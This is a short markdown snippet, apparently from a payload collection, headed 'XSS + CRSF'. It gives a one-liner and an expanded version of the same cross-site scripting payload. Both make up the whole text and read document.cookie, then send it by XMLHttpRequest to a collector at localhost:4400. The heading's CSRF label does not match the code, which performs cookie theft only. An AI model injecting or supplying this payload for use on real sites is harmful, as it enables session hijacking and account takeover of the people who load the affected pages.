# XSS + CRSF

## One-liner version
```html
<script>var xhr = (new window.XMLHttpRequest()); xhr.open("GET", "http://localhost:4400?cookie=" + document.cookie ); xhr.send();</script>
```

## Expanded version
```html
<script>
	var xhr = (new window.XMLHttpRequest()); 
	xhr.open("GET", "http://localhost:4400?cookie=" + document.cookie ); 
	xhr.send();
</script>
```
